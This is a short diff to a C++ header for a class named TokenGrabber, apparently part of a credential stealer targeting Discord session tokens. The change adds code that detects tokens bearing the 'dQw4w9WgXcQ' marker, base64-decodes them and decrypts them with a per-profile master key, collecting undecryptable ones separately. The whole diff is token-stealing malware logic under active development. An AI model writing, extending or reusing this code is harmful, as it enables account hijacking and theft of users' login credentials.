@@ -1,6 +1,7 @@
 #pragma once
 
 #include "utils/utils.hpp"
+#include <mutex>
 
 class TokenGrabber {
 public:
@@ -110,16 +111,21 @@ public:
 
             for (const std::string &raw_token : encrypted_token_list) {
 
-                if (raw_token.length() <= 12) { continue; }
+                if (!(raw_token.find("dQw4w9WgXcQ") != std::string::npos)) {
+                    result.push_back("UNDECRYPTED_TOKEN{" + raw_token + "}");
+                    continue;
+                }
 
                 std::string trimmed_token = raw_token.substr(12);
+
+                std::string &master_key = master_key_list[index];
 
                 std::string token_frombase64;
                 base64::decode(trimmed_token, token_frombase64);
 
                 std::string decrypted_token;
-                decrypt(token_frombase64, master_key_list[index], decrypted_token);
-
+                decrypt(token_frombase64, master_key, decrypted_token);
+                
                 result.push_back(decrypted_token);
             }
 
